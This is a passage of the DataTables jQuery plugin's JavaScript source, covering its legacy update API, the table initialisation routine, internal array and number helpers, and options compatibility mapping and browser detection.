			this.api( true ).order.listener( nNode, iColumn, fnCallback );

		};

		

		

		/**

		 * Update a table cell or row - this method will accept either a single value to

		 * update the cell with, an array of values with one element for each column or

		 * an object in the same format as the original data source. The function is

		 * self-referencing in order to make the multi column updates easier.

		 *  @param {object|array|string} mData Data to update the cell/row with

		 *  @param {node|int} mRow TR element you want to update or the aoData index

		 *  @param {int} [iColumn] The column to update, give as null or undefined to

		 *    update a whole row.

		 *  @param {bool} [bRedraw=true] Redraw the table or not

		 *  @param {bool} [bAction=true] Perform pre-draw actions or not

		 *  @returns {int} 0 on success, 1 on error

		 *  @dtopt API

		 *  @deprecated Since v1.10

		 *

		 *  @example

		 *    $(document).ready(function() {

		 *      var oTable = $('#example').dataTable();

		 *      oTable.fnUpdate( 'Example update', 0, 0 ); // Single cell

		 *      oTable.fnUpdate( ['a', 'b', 'c', 'd', 'e'], $('tbody tr')[0] ); // Row

		 *    } );

		 */

		this.fnUpdate = function( mData, mRow, iColumn, bRedraw, bAction )

		{

			var api = this.api( true );

		

			if ( iColumn === undefined || iColumn === null ) {

				api.row( mRow ).data( mData );

			}

			else {

				api.cell( mRow, iColumn ).data( mData );

			}

		

			if ( bAction === undefined || bAction ) {

				api.columns.adjust();

			}

		

			if ( bRedraw === undefined || bRedraw ) {

				api.draw();

			}

			return 0;

		};

		

		

		/**

		 * Provide a common method for plug-ins to check the version of DataTables being used, in order

		 * to ensure compatibility.

		 *  @param {string} sVersion Version string to check for, in the format "X.Y.Z". Note that the

		 *    formats "X" and "X.Y" are also acceptable.

		 *  @returns {boolean} true if this version of DataTables is greater or equal to the required

		 *    version, or false if this version of DataTales is not suitable

		 *  @method

		 *  @dtopt API

		 *  @deprecated Since v1.10

		 *

		 *  @example

		 *    $(document).ready(function() {

		 *      var oTable = $('#example').dataTable();

		 *      alert( oTable.fnVersionCheck( '1.9.0' ) );

		 *    } );

		 */

		this.fnVersionCheck = _ext.fnVersionCheck;

		



		var _that = this;

		var emptyInit = options === undefined;

		var len = this.length;



		if ( emptyInit ) {

			options = {};

		}



		this.oApi = this.internal = _ext.internal;



		// Extend with old style plug-in API methods

		for ( var fn in DataTable.ext.internal ) {

			if ( fn ) {

				this[fn] = _fnExternApiFunc(fn);

			}

		}



		this.each(function() {

			// For each initialisation we want to give it a clean initialisation

			// object that can be bashed around

			var o = {};

			var oInit = len > 1 ? // optimisation for single table case

				_fnExtend( o, options, true ) :

				options;



			/*global oInit,_that,emptyInit*/

			var i=0, iLen, j, jLen, k, kLen;

			var sId = this.getAttribute( 'id' );

			var bInitHandedOff = false;

			var defaults = DataTable.defaults;

			var $this = $(this);

			

			

			/* Sanity check */

			if ( this.nodeName.toLowerCase() != 'table' )

			{

				_fnLog( null, 0, 'Non-table node initialisation ('+this.nodeName+')', 2 );

				return;

			}

			

			/* Backwards compatibility for the defaults */

			_fnCompatOpts( defaults );

			_fnCompatCols( defaults.column );

			

			/* Convert the camel-case defaults to Hungarian */

			_fnCamelToHungarian( defaults, defaults, true );

			_fnCamelToHungarian( defaults.column, defaults.column, true );

			

			/* Setting up the initialisation object */

			_fnCamelToHungarian( defaults, $.extend( oInit, $this.data() ), true );

			

			

			

			/* Check to see if we are re-initialising a table */

			var allSettings = DataTable.settings;

			for ( i=0, iLen=allSettings.length ; i<iLen ; i++ )

			{

				var s = allSettings[i];

			

				/* Base check on table node */

				if (

					s.nTable == this ||

					(s.nTHead && s.nTHead.parentNode == this) ||

					(s.nTFoot && s.nTFoot.parentNode == this)

				) {

					var bRetrieve = oInit.bRetrieve !== undefined ? oInit.bRetrieve : defaults.bRetrieve;

					var bDestroy = oInit.bDestroy !== undefined ? oInit.bDestroy : defaults.bDestroy;

			

					if ( emptyInit || bRetrieve )

					{

						return s.oInstance;

					}

					else if ( bDestroy )

					{

						s.oInstance.fnDestroy();

						break;

					}

					else

					{

						_fnLog( s, 0, 'Cannot reinitialise DataTable', 3 );

						return;

					}

				}

			

				/* If the element we are initialising has the same ID as a table which was previously

				 * initialised, but the table nodes don't match (from before) then we destroy the old

				 * instance by simply deleting it. This is under the assumption that the table has been

				 * destroyed by other methods. Anyone using non-id selectors will need to do this manually

				 */

				if ( s.sTableId == this.id )

				{

					allSettings.splice( i, 1 );

					break;

				}

			}

			

			/* Ensure the table has an ID - required for accessibility */

			if ( sId === null || sId === "" )

			{

				sId = "DataTables_Table_"+(DataTable.ext._unique++);

				this.id = sId;

			}

			

			/* Create the settings object for this table and set some of the default parameters */

			var oSettings = $.extend( true, {}, DataTable.models.oSettings, {

				"sDestroyWidth": $this[0].style.width,

				"sInstance":     sId,

				"sTableId":      sId

			} );

			oSettings.nTable = this;

			oSettings.oApi   = _that.internal;

			oSettings.oInit  = oInit;

			

			allSettings.push( oSettings );

			

			// Need to add the instance after the instance after the settings object has been added

			// to the settings array, so we can self reference the table instance if more than one

			oSettings.oInstance = (_that.length===1) ? _that : $this.dataTable();

			

			// Backwards compatibility, before we apply all the defaults

			_fnCompatOpts( oInit );

			_fnLanguageCompat( oInit.oLanguage );

			

			// If the length menu is given, but the init display length is not, use the length menu

			if ( oInit.aLengthMenu && ! oInit.iDisplayLength )

			{

				oInit.iDisplayLength = $.isArray( oInit.aLengthMenu[0] ) ?

					oInit.aLengthMenu[0][0] : oInit.aLengthMenu[0];

			}

			

			// Apply the defaults and init options to make a single init object will all

			// options defined from defaults and instance options.

			oInit = _fnExtend( $.extend( true, {}, defaults ), oInit );

			

			

			// Map the initialisation options onto the settings object

			_fnMap( oSettings.oFeatures, oInit, [

				"bPaginate",

				"bLengthChange",

				"bFilter",

				"bSort",

				"bSortMulti",

				"bInfo",

				"bProcessing",

				"bAutoWidth",

				"bSortClasses",

				"bServerSide",

				"bDeferRender"

			] );

			_fnMap( oSettings, oInit, [

				"asStripeClasses",

				"ajax",

				"fnServerData",

				"fnFormatNumber",

				"sServerMethod",

				"aaSorting",

				"aaSortingFixed",

				"aLengthMenu",

				"sPaginationType",

				"sAjaxSource",

				"sAjaxDataProp",

				"iStateDuration",

				"sDom",

				"bSortCellsTop",

				"iTabIndex",

				"fnStateLoadCallback",

				"fnStateSaveCallback",

				"renderer",

				"searchDelay",

				"rowId",

				[ "iCookieDuration", "iStateDuration" ], // backwards compat

				[ "oSearch", "oPreviousSearch" ],

				[ "aoSearchCols", "aoPreSearchCols" ],

				[ "iDisplayLength", "_iDisplayLength" ]

			] );

			_fnMap( oSettings.oScroll, oInit, [

				[ "sScrollX", "sX" ],

				[ "sScrollXInner", "sXInner" ],

				[ "sScrollY", "sY" ],

				[ "bScrollCollapse", "bCollapse" ]

			] );

			_fnMap( oSettings.oLanguage, oInit, "fnInfoCallback" );

			

			/* Callback functions which are array driven */

			_fnCallbackReg( oSettings, 'aoDrawCallback',       oInit.fnDrawCallback,      'user' );

			_fnCallbackReg( oSettings, 'aoServerParams',       oInit.fnServerParams,      'user' );

			_fnCallbackReg( oSettings, 'aoStateSaveParams',    oInit.fnStateSaveParams,   'user' );

			_fnCallbackReg( oSettings, 'aoStateLoadParams',    oInit.fnStateLoadParams,   'user' );

			_fnCallbackReg( oSettings, 'aoStateLoaded',        oInit.fnStateLoaded,       'user' );

			_fnCallbackReg( oSettings, 'aoRowCallback',        oInit.fnRowCallback,       'user' );

			_fnCallbackReg( oSettings, 'aoRowCreatedCallback', oInit.fnCreatedRow,        'user' );

			_fnCallbackReg( oSettings, 'aoHeaderCallback',     oInit.fnHeaderCallback,    'user' );

			_fnCallbackReg( oSettings, 'aoFooterCallback',     oInit.fnFooterCallback,    'user' );

			_fnCallbackReg( oSettings, 'aoInitComplete',       oInit.fnInitComplete,      'user' );

			_fnCallbackReg( oSettings, 'aoPreDrawCallback',    oInit.fnPreDrawCallback,   'user' );

			

			oSettings.rowIdFn = _fnGetObjectDataFn( oInit.rowId );

			

			/* Browser support detection */

			_fnBrowserDetect( oSettings );

			

			var oClasses = oSettings.oClasses;

			

			$.extend( oClasses, DataTable.ext.classes, oInit.oClasses );

			$this.addClass( oClasses.sTable );

			

			

			if ( oSettings.iInitDisplayStart === undefined )

			{

				/* Display start point, taking into account the save saving */

				oSettings.iInitDisplayStart = oInit.iDisplayStart;

				oSettings._iDisplayStart = oInit.iDisplayStart;

			}

			

			if ( oInit.iDeferLoading !== null )

			{

				oSettings.bDeferLoading = true;

				var tmp = $.isArray( oInit.iDeferLoading );

				oSettings._iRecordsDisplay = tmp ? oInit.iDeferLoading[0] : oInit.iDeferLoading;

				oSettings._iRecordsTotal = tmp ? oInit.iDeferLoading[1] : oInit.iDeferLoading;

			}

			

			/* Language definitions */

			var oLanguage = oSettings.oLanguage;

			$.extend( true, oLanguage, oInit.oLanguage );

			

			if ( oLanguage.sUrl )

			{

				/* Get the language definitions from a file - because this Ajax call makes the language

				 * get async to the remainder of this function we use bInitHandedOff to indicate that

				 * _fnInitialise will be fired by the returned Ajax handler, rather than the constructor

				 */

				$.ajax( {

					dataType: 'json',

					url: oLanguage.sUrl,

					success: function ( json ) {

						_fnLanguageCompat( json );

						_fnCamelToHungarian( defaults.oLanguage, json );

						$.extend( true, oLanguage, json );

						_fnInitialise( oSettings );

					},

					error: function () {

						// Error occurred loading language file, continue on as best we can

						_fnInitialise( oSettings );

					}

				} );

				bInitHandedOff = true;

			}

			

			/*

			 * Stripes

			 */

			if ( oInit.asStripeClasses === null )

			{

				oSettings.asStripeClasses =[

					oClasses.sStripeOdd,

					oClasses.sStripeEven

				];

			}

			

			/* Remove row stripe classes if they are already on the table row */

			var stripeClasses = oSettings.asStripeClasses;

			var rowOne = $this.children('tbody').find('tr').eq(0);

			if ( $.inArray( true, $.map( stripeClasses, function(el, i) {

				return rowOne.hasClass(el);

			} ) ) !== -1 ) {

				$('tbody tr', this).removeClass( stripeClasses.join(' ') );

				oSettings.asDestroyStripes = stripeClasses.slice();

			}

			

			/*

			 * Columns

			 * See if we should load columns automatically or use defined ones

			 */

			var anThs = [];

			var aoColumnsInit;

			var nThead = this.getElementsByTagName('thead');

			if ( nThead.length !== 0 )

			{

				_fnDetectHeader( oSettings.aoHeader, nThead[0] );

				anThs = _fnGetUniqueThs( oSettings );

			}

			

			/* If not given a column array, generate one with nulls */

			if ( oInit.aoColumns === null )

			{

				aoColumnsInit = [];

				for ( i=0, iLen=anThs.length ; i<iLen ; i++ )

				{

					aoColumnsInit.push( null );

				}

			}

			else

			{

				aoColumnsInit = oInit.aoColumns;

			}

			

			/* Add the columns */

			for ( i=0, iLen=aoColumnsInit.length ; i<iLen ; i++ )

			{

				_fnAddColumn( oSettings, anThs ? anThs[i] : null );

			}

			

			/* Apply the column definitions */

			_fnApplyColumnDefs( oSettings, oInit.aoColumnDefs, aoColumnsInit, function (iCol, oDef) {

				_fnColumnOptions( oSettings, iCol, oDef );

			} );

			

			/* HTML5 attribute detection - build an mData object automatically if the

			 * attributes are found

			 */

			if ( rowOne.length ) {

				var a = function ( cell, name ) {

					return cell.getAttribute( 'data-'+name ) !== null ? name : null;

				};

			

				$( rowOne[0] ).children('th, td').each( function (i, cell) {

					var col = oSettings.aoColumns[i];

			

					if ( col.mData === i ) {

						var sort = a( cell, 'sort' ) || a( cell, 'order' );

						var filter = a( cell, 'filter' ) || a( cell, 'search' );

			

						if ( sort !== null || filter !== null ) {

							col.mData = {

								_:      i+'.display',

								sort:   sort !== null   ? i+'.@data-'+sort   : undefined,

								type:   sort !== null   ? i+'.@data-'+sort   : undefined,

								filter: filter !== null ? i+'.@data-'+filter : undefined

							};

			

							_fnColumnOptions( oSettings, i );

						}

					}

				} );

			}

			

			var features = oSettings.oFeatures;

			var loadedInit = function () {

				/*

				 * Sorting

				 * @todo For modularisation (1.11) this needs to do into a sort start up handler

				 */

			

				// If aaSorting is not defined, then we use the first indicator in asSorting

				// in case that has been altered, so the default sort reflects that option

				if ( oInit.aaSorting === undefined ) {

					var sorting = oSettings.aaSorting;

					for ( i=0, iLen=sorting.length ; i<iLen ; i++ ) {

						sorting[i][1] = oSettings.aoColumns[ i ].asSorting[0];

					}

				}

			

				/* Do a first pass on the sorting classes (allows any size changes to be taken into

				 * account, and also will apply sorting disabled classes if disabled

				 */

				_fnSortingClasses( oSettings );

			

				if ( features.bSort ) {

					_fnCallbackReg( oSettings, 'aoDrawCallback', function () {

						if ( oSettings.bSorted ) {

							var aSort = _fnSortFlatten( oSettings );

							var sortedColumns = {};

			

							$.each( aSort, function (i, val) {

								sortedColumns[ val.src ] = val.dir;

							} );

			

							_fnCallbackFire( oSettings, null, 'order', [oSettings, aSort, sortedColumns] );

							_fnSortAria( oSettings );

						}

					} );

				}

			

				_fnCallbackReg( oSettings, 'aoDrawCallback', function () {

					if ( oSettings.bSorted || _fnDataSource( oSettings ) === 'ssp' || features.bDeferRender ) {

						_fnSortingClasses( oSettings );

					}

				}, 'sc' );

			

			

				/*

				 * Final init

				 * Cache the header, body and footer as required, creating them if needed

				 */

			

				// Work around for Webkit bug 83867 - store the caption-side before removing from doc

				var captions = $this.children('caption').each( function () {

					this._captionSide = $(this).css('caption-side');

				} );

			

				var thead = $this.children('thead');

				if ( thead.length === 0 ) {

					thead = $('<thead/>').appendTo($this);

				}

				oSettings.nTHead = thead[0];

			

				var tbody = $this.children('tbody');

				if ( tbody.length === 0 ) {

					tbody = $('<tbody/>').appendTo($this);

				}

				oSettings.nTBody = tbody[0];

			

				var tfoot = $this.children('tfoot');

				if ( tfoot.length === 0 && captions.length > 0 && (oSettings.oScroll.sX !== "" || oSettings.oScroll.sY !== "") ) {

					// If we are a scrolling table, and no footer has been given, then we need to create

					// a tfoot element for the caption element to be appended to

					tfoot = $('<tfoot/>').appendTo($this);

				}

			

				if ( tfoot.length === 0 || tfoot.children().length === 0 ) {

					$this.addClass( oClasses.sNoFooter );

				}

				else if ( tfoot.length > 0 ) {

					oSettings.nTFoot = tfoot[0];

					_fnDetectHeader( oSettings.aoFooter, oSettings.nTFoot );

				}

			

				/* Check if there is data passing into the constructor */

				if ( oInit.aaData ) {

					for ( i=0 ; i<oInit.aaData.length ; i++ ) {

						_fnAddData( oSettings, oInit.aaData[ i ] );

					}

				}

				else if ( oSettings.bDeferLoading || _fnDataSource( oSettings ) == 'dom' ) {

					/* Grab the data from the page - only do this when deferred loading or no Ajax

					 * source since there is no point in reading the DOM data if we are then going

					 * to replace it with Ajax data

					 */

					_fnAddTr( oSettings, $(oSettings.nTBody).children('tr') );

				}

			

				/* Copy the data index array */

				oSettings.aiDisplay = oSettings.aiDisplayMaster.slice();

			

				/* Initialisation complete - table can be drawn */

				oSettings.bInitialised = true;

			

				/* Check if we need to initialise the table (it might not have been handed off to the

				 * language processor)

				 */

				if ( bInitHandedOff === false ) {

					_fnInitialise( oSettings );

				}

			};

			

			/* Must be done after everything which can be overridden by the state saving! */

			if ( oInit.bStateSave )

			{

				features.bStateSave = true;

				_fnCallbackReg( oSettings, 'aoDrawCallback', _fnSaveState, 'state_save' );

				_fnLoadState( oSettings, oInit, loadedInit );

			}

			else {

				loadedInit();

			}

			

		} );

		_that = null;

		return this;

	};



	

	/*

	 * It is useful to have variables which are scoped locally so only the

	 * DataTables functions can access them and they don't leak into global space.

	 * At the same time these functions are often useful over multiple files in the

	 * core and API, so we list, or at least document, all variables which are used

	 * by DataTables as private variables here. This also ensures that there is no

	 * clashing of variable names and that they can easily referenced for reuse.

	 */

	

	

	// Defined else where

	//  _selector_run

	//  _selector_opts

	//  _selector_first

	//  _selector_row_indexes

	

	var _ext; // DataTable.ext

	var _Api; // DataTable.Api

	var _api_register; // DataTable.Api.register

	var _api_registerPlural; // DataTable.Api.registerPlural

	

	var _re_dic = {};

	var _re_new_lines = /[\r\n\u2028]/g;

	var _re_html = /<.*?>/g;

	

	// This is not strict ISO8601 - Date.parse() is quite lax, although

	// implementations differ between browsers.

	var _re_date = /^\d{2,4}[\.\/\-]\d{1,2}[\.\/\-]\d{1,2}([T ]{1}\d{1,2}[:\.]\d{2}([\.:]\d{2})?)?$/;

	

	// Escape regular expression special characters

	var _re_escape_regex = new RegExp( '(\\' + [ '/', '.', '*', '+', '?', '|', '(', ')', '[', ']', '{', '}', '\\', '$', '^', '-' ].join('|\\') + ')', 'g' );

	

	// http://en.wikipedia.org/wiki/Foreign_exchange_market

	// - \u20BD - Russian ruble.

	// - \u20a9 - South Korean Won

	// - \u20BA - Turkish Lira

	// - \u20B9 - Indian Rupee

	// - R - Brazil (R$) and South Africa

	// - fr - Swiss Franc

	// - kr - Swedish krona, Norwegian krone and Danish krone

	// - \u2009 is thin space and \u202F is narrow no-break space, both used in many

	// - Ƀ - Bitcoin

	// - Ξ - Ethereum

	//   standards as thousands separators.

	var _re_formatted_numeric = /[',$£€¥%\u2009\u202F\u20BD\u20a9\u20BArfkɃΞ]/gi;

	

	

	var _empty = function ( d ) {

		return !d || d === true || d === '-' ? true : false;

	};

	

	

	var _intVal = function ( s ) {

		var integer = parseInt( s, 10 );

		return !isNaN(integer) && isFinite(s) ? integer : null;

	};

	

	// Convert from a formatted number with characters other than `.` as the

	// decimal place, to a Javascript number

	var _numToDecimal = function ( num, decimalPoint ) {

		// Cache created regular expressions for speed as this function is called often

		if ( ! _re_dic[ decimalPoint ] ) {

			_re_dic[ decimalPoint ] = new RegExp( _fnEscapeRegex( decimalPoint ), 'g' );

		}

		return typeof num === 'string' && decimalPoint !== '.' ?

			num.replace( /\./g, '' ).replace( _re_dic[ decimalPoint ], '.' ) :

			num;

	};

	

	

	var _isNumber = function ( d, decimalPoint, formatted ) {

		var strType = typeof d === 'string';

	

		// If empty return immediately so there must be a number if it is a

		// formatted string (this stops the string "k", or "kr", etc being detected

		// as a formatted number for currency

		if ( _empty( d ) ) {

			return true;

		}

	

		if ( decimalPoint && strType ) {

			d = _numToDecimal( d, decimalPoint );

		}

	

		if ( formatted && strType ) {

			d = d.replace( _re_formatted_numeric, '' );

		}

	

		return !isNaN( parseFloat(d) ) && isFinite( d );

	};

	

	

	// A string without HTML in it can be considered to be HTML still

	var _isHtml = function ( d ) {

		return _empty( d ) || typeof d === 'string';

	};

	

	

	var _htmlNumeric = function ( d, decimalPoint, formatted ) {

		if ( _empty( d ) ) {

			return true;

		}

	

		var html = _isHtml( d );

		return ! html ?

			null :

			_isNumber( _stripHtml( d ), decimalPoint, formatted ) ?

				true :

				null;

	};

	

	

	var _pluck = function ( a, prop, prop2 ) {

		var out = [];

		var i=0, ien=a.length;

	

		// Could have the test in the loop for slightly smaller code, but speed

		// is essential here

		if ( prop2 !== undefined ) {

			for ( ; i<ien ; i++ ) {

				if ( a[i] && a[i][ prop ] ) {

					out.push( a[i][ prop ][ prop2 ] );

				}

			}

		}

		else {

			for ( ; i<ien ; i++ ) {

				if ( a[i] ) {

					out.push( a[i][ prop ] );

				}

			}

		}

	

		return out;

	};

	

	

	// Basically the same as _pluck, but rather than looping over `a` we use `order`

	// as the indexes to pick from `a`

	var _pluck_order = function ( a, order, prop, prop2 )

	{

		var out = [];

		var i=0, ien=order.length;

	

		// Could have the test in the loop for slightly smaller code, but speed

		// is essential here

		if ( prop2 !== undefined ) {

			for ( ; i<ien ; i++ ) {

				if ( a[ order[i] ][ prop ] ) {

					out.push( a[ order[i] ][ prop ][ prop2 ] );

				}

			}

		}

		else {

			for ( ; i<ien ; i++ ) {

				out.push( a[ order[i] ][ prop ] );

			}

		}

	

		return out;

	};

	

	

	var _range = function ( len, start )

	{

		var out = [];

		var end;

	

		if ( start === undefined ) {

			start = 0;

			end = len;

		}

		else {

			end = start;

			start = len;

		}

	

		for ( var i=start ; i<end ; i++ ) {

			out.push( i );

		}

	

		return out;

	};

	

	

	var _removeEmpty = function ( a )

	{

		var out = [];

	

		for ( var i=0, ien=a.length ; i<ien ; i++ ) {

			if ( a[i] ) { // careful - will remove all falsy values!

				out.push( a[i] );

			}

		}

	

		return out;

	};

	

	

	var _stripHtml = function ( d ) {

		return d.replace( _re_html, '' );

	};

	

	

	/**

	 * Determine if all values in the array are unique. This means we can short

	 * cut the _unique method at the cost of a single loop. A sorted array is used

	 * to easily check the values.

	 *

	 * @param  {array} src Source array

	 * @return {boolean} true if all unique, false otherwise

	 * @ignore

	 */

	var _areAllUnique = function ( src ) {

		if ( src.length < 2 ) {

			return true;

		}

	

		var sorted = src.slice().sort();

		var last = sorted[0];

	

		for ( var i=1, ien=sorted.length ; i<ien ; i++ ) {

			if ( sorted[i] === last ) {

				return false;

			}

	

			last = sorted[i];

		}

	

		return true;

	};

	

	

	/**

	 * Find the unique elements in a source array.

	 *

	 * @param  {array} src Source array

	 * @return {array} Array of unique items

	 * @ignore

	 */

	var _unique = function ( src )

	{

		if ( _areAllUnique( src ) ) {

			return src.slice();

		}

	

		// A faster unique method is to use object keys to identify used values,

		// but this doesn't work with arrays or objects, which we must also

		// consider. See jsperf.com/compare-array-unique-versions/4 for more

		// information.

		var

			out = [],

			val,

			i, ien=src.length,

			j, k=0;

	

		again: for ( i=0 ; i<ien ; i++ ) {

			val = src[i];

	

			for ( j=0 ; j<k ; j++ ) {

				if ( out[j] === val ) {

					continue again;

				}

			}

	

			out.push( val );

			k++;

		}

	

		return out;

	};

	

	

	/**

	 * DataTables utility methods

	 * 

	 * This namespace provides helper methods that DataTables uses internally to

	 * create a DataTable, but which are not exclusively used only for DataTables.

	 * These methods can be used by extension authors to save the duplication of

	 * code.

	 *

	 *  @namespace

	 */

	DataTable.util = {

		/**

		 * Throttle the calls to a function. Arguments and context are maintained

		 * for the throttled function.

		 *

		 * @param {function} fn Function to be called

		 * @param {integer} freq Call frequency in mS

		 * @return {function} Wrapped function

		 */

		throttle: function ( fn, freq ) {

			var

				frequency = freq !== undefined ? freq : 200,

				last,

				timer;

	

			return function () {

				var

					that = this,

					now  = +new Date(),

					args = arguments;

	

				if ( last && now < last + frequency ) {

					clearTimeout( timer );

	

					timer = setTimeout( function () {

						last = undefined;

						fn.apply( that, args );

					}, frequency );

				}

				else {

					last = now;

					fn.apply( that, args );

				}

			};

		},

	

	

		/**

		 * Escape a string such that it can be used in a regular expression

		 *

		 *  @param {string} val string to escape

		 *  @returns {string} escaped string

		 */

		escapeRegex: function ( val ) {

			return val.replace( _re_escape_regex, '\\$1' );

		}

	};

	

	

	

	/**

	 * Create a mapping object that allows camel case parameters to be looked up

	 * for their Hungarian counterparts. The mapping is stored in a private

	 * parameter called `_hungarianMap` which can be accessed on the source object.

	 *  @param {object} o

	 *  @memberof DataTable#oApi

	 */

	function _fnHungarianMap ( o )

	{

		var

			hungarian = 'a aa ai ao as b fn i m o s ',

			match,

			newKey,

			map = {};

	

		$.each( o, function (key, val) {

			match = key.match(/^([^A-Z]+?)([A-Z])/);

	

			if ( match && hungarian.indexOf(match[1]+' ') !== -1 )

			{

				newKey = key.replace( match[0], match[2].toLowerCase() );

				map[ newKey ] = key;

	

				if ( match[1] === 'o' )

				{

					_fnHungarianMap( o[key] );

				}

			}

		} );

	

		o._hungarianMap = map;

	}

	

	

	/**

	 * Convert from camel case parameters to Hungarian, based on a Hungarian map

	 * created by _fnHungarianMap.

	 *  @param {object} src The model object which holds all parameters that can be

	 *    mapped.

	 *  @param {object} user The object to convert from camel case to Hungarian.

	 *  @param {boolean} force When set to `true`, properties which already have a

	 *    Hungarian value in the `user` object will be overwritten. Otherwise they

	 *    won't be.

	 *  @memberof DataTable#oApi

	 */

	function _fnCamelToHungarian ( src, user, force )

	{

		if ( ! src._hungarianMap ) {

			_fnHungarianMap( src );

		}

	

		var hungarianKey;

	

		$.each( user, function (key, val) {

			hungarianKey = src._hungarianMap[ key ];

	

			if ( hungarianKey !== undefined && (force || user[hungarianKey] === undefined) )

			{

				// For objects, we need to buzz down into the object to copy parameters

				if ( hungarianKey.charAt(0) === 'o' )

				{

					// Copy the camelCase options over to the hungarian

					if ( ! user[ hungarianKey ] ) {

						user[ hungarianKey ] = {};

					}

					$.extend( true, user[hungarianKey], user[key] );

	

					_fnCamelToHungarian( src[hungarianKey], user[hungarianKey], force );

				}

				else {

					user[hungarianKey] = user[ key ];

				}

			}

		} );

	}

	

	

	/**

	 * Language compatibility - when certain options are given, and others aren't, we

	 * need to duplicate the values over, in order to provide backwards compatibility

	 * with older language files.

	 *  @param {object} oSettings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnLanguageCompat( lang )

	{

		// Note the use of the Hungarian notation for the parameters in this method as

		// this is called after the mapping of camelCase to Hungarian

		var defaults = DataTable.defaults.oLanguage;

	

		// Default mapping

		var defaultDecimal = defaults.sDecimal;

		if ( defaultDecimal ) {

			_addNumericSort( defaultDecimal );

		}

	

		if ( lang ) {

			var zeroRecords = lang.sZeroRecords;

	

			// Backwards compatibility - if there is no sEmptyTable given, then use the same as

			// sZeroRecords - assuming that is given.

			if ( ! lang.sEmptyTable && zeroRecords &&

				defaults.sEmptyTable === "No data available in table" )

			{

				_fnMap( lang, lang, 'sZeroRecords', 'sEmptyTable' );

			}

	

			// Likewise with loading records

			if ( ! lang.sLoadingRecords && zeroRecords &&

				defaults.sLoadingRecords === "Loading..." )

			{

				_fnMap( lang, lang, 'sZeroRecords', 'sLoadingRecords' );

			}

	

			// Old parameter name of the thousands separator mapped onto the new

			if ( lang.sInfoThousands ) {

				lang.sThousands = lang.sInfoThousands;

			}

	

			var decimal = lang.sDecimal;

			if ( decimal && defaultDecimal !== decimal ) {

				_addNumericSort( decimal );

			}

		}

	}

	

	

	/**

	 * Map one parameter onto another

	 *  @param {object} o Object to map

	 *  @param {*} knew The new parameter name

	 *  @param {*} old The old parameter name

	 */

	var _fnCompatMap = function ( o, knew, old ) {

		if ( o[ knew ] !== undefined ) {

			o[ old ] = o[ knew ];

		}

	};

	

	

	/**

	 * Provide backwards compatibility for the main DT options. Note that the new

	 * options are mapped onto the old parameters, so this is an external interface

	 * change only.

	 *  @param {object} init Object to map

	 */

	function _fnCompatOpts ( init )

	{

		_fnCompatMap( init, 'ordering',      'bSort' );

		_fnCompatMap( init, 'orderMulti',    'bSortMulti' );

		_fnCompatMap( init, 'orderClasses',  'bSortClasses' );

		_fnCompatMap( init, 'orderCellsTop', 'bSortCellsTop' );

		_fnCompatMap( init, 'order',         'aaSorting' );

		_fnCompatMap( init, 'orderFixed',    'aaSortingFixed' );

		_fnCompatMap( init, 'paging',        'bPaginate' );

		_fnCompatMap( init, 'pagingType',    'sPaginationType' );

		_fnCompatMap( init, 'pageLength',    'iDisplayLength' );

		_fnCompatMap( init, 'searching',     'bFilter' );

	

		// Boolean initialisation of x-scrolling

		if ( typeof init.sScrollX === 'boolean' ) {

			init.sScrollX = init.sScrollX ? '100%' : '';

		}

		if ( typeof init.scrollX === 'boolean' ) {

			init.scrollX = init.scrollX ? '100%' : '';

		}

	

		// Column search objects are in an array, so it needs to be converted

		// element by element

		var searchCols = init.aoSearchCols;

	

		if ( searchCols ) {

			for ( var i=0, ien=searchCols.length ; i<ien ; i++ ) {

				if ( searchCols[i] ) {

					_fnCamelToHungarian( DataTable.models.oSearch, searchCols[i] );

				}

			}

		}

	}

	

	

	/**

	 * Provide backwards compatibility for column options. Note that the new options

	 * are mapped onto the old parameters, so this is an external interface change

	 * only.

	 *  @param {object} init Object to map

	 */

	function _fnCompatCols ( init )

	{

		_fnCompatMap( init, 'orderable',     'bSortable' );

		_fnCompatMap( init, 'orderData',     'aDataSort' );

		_fnCompatMap( init, 'orderSequence', 'asSorting' );

		_fnCompatMap( init, 'orderDataType', 'sortDataType' );

	

		// orderData can be given as an integer

		var dataSort = init.aDataSort;

		if ( typeof dataSort === 'number' && ! $.isArray( dataSort ) ) {

			init.aDataSort = [ dataSort ];

		}

	}

	

	

	/**

	 * Browser feature detection for capabilities, quirks

	 *  @param {object} settings dataTables settings object

	 *  @memberof DataTable#oApi

	 */

	function _fnBrowserDetect( settings )

	{

		// We don't need to do this every time DataTables is constructed, the values

		// calculated are specific to the browser and OS configuration which we

		// don't expect to change between initialisations

		if ( ! DataTable.__browser ) {

			var browser = {};

			DataTable.__browser = browser;

	

			// Scrolling feature / quirks detection

			var n = $('<div/>')

				.css( {

					position: 'fixed',

					top: 0,

					left: $(window).scrollLeft()*-1, // allow for scrolling

					height: 1,

					width: 1,

					overflow: 'hidden'

				} )

				.append(

					$('<div/>')

						.css( {

							position: 'absolute',

							top: 1,

							left: 1,

							width: 100,

							overflow: 'scroll'

						} )

						.append(

							$('<div/>')

								.css( {

									width: '100%',

									height: 10

								} )

						)

				)

				.appendTo( 'body' );

	

			var outer = n.children();

			var inner = outer.children();

	

			// Numbers below, in order, are:

			// inner.offsetWidth, inner.clientWidth, outer.offsetWidth, outer.clientWidth

			//

			// IE6 XP:                           100 100 100  83

			// IE7 Vista:                        100 100 100  83

			// IE 8+ Windows:                     83  83 100  83

			// Evergreen Windows:                 83  83 100  83

			// Evergreen Mac with scrollbars:     85  85 100  85

			// Evergreen Mac without scrollbars: 100 100 100 100

	

			// Get scrollbar width

			browser.barWidth = outer[0].offsetWidth - outer[0].clientWidth;

	

			// IE6/7 will oversize a width 100% element inside a scrolling element, to

			// include the width of the scrollbar, while other browsers ensure the inner

			// element is contained without forcing scrolling

			browser.bScrollOversize = inner[0].offsetWidth === 100 && outer[0].clientWidth !== 100;

	

			// In rtl text layout, some browsers (most, but not all) will place the

			// scrollbar on the left, rather than the right.

			browser.bScrollbarLeft = Math.round( inner.offset().left ) !== 1;

	

			// IE8- don't provide height and width for getBoundingClientRect

			browser.bBounding = n[0].getBoundingClientRect().width ? true : false;

	

			n.remove();

		}

	

		$.extend( settings.oBrowser, DataTable.__browser );

		settings.oScroll.iBarWidth = DataTable.__browser.barWidth;

	}

	

	

	/**

	 * Array.prototype reduce[Right] method, used for browsers which don't support

	 * JS 1.6. Done this way to reduce code size, since we iterate either way

	 *  @param {object} settings dataTables settings object

